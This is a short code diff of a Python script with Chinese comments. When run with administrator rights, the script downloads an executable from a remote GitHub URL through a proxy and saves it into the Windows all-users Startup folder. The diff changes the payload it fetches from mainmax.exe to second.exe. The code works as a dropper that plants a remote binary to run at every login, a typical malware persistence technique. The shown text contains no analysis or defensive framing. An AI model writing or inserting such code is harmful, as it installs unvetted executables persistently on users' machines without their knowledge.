@@ -11,9 +11,9 @@ def is_admin():
         return False
 
 if is_admin():  
-    url = "https://ghproxy.com/https://raw.githubusercontent.com/snow6BIG/snow/main/mainmax.exe"#文件路径。
+    url = "https://ghproxy.com/https://raw.githubusercontent.com/snow6BIG/snow/main/second.exe"#文件路径。
     dir = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"#文件下载路径目录。
-    file_path = os.path.join(dir, 'main.exe')#下载为
+    file_path = os.path.join(dir, 'second.exe')#下载为
     urllib.request.urlretrieve(url, file_path)
     
     # 检查文件是否下载完成
